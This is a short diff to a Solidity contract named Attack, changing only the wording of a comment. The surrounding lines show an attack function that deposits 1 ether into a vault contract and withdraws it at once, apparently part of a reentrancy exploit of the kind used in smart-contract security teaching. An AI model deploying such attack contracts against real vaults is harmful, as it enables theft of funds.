@@ -24,7 +24,7 @@ contract Attack {
     //Attack function
     function attack() public payable
     {   
-        require(msg.value >= 1 ether); //Validate if the attacker deposited have the ether to attack
+        require(msg.value >= 1 ether); //Validate if the attacker deposit have the ether to attack
         vault.deposit.value(1 ether)(msg.sender);
         vault.withdraw(1 ether);
     }
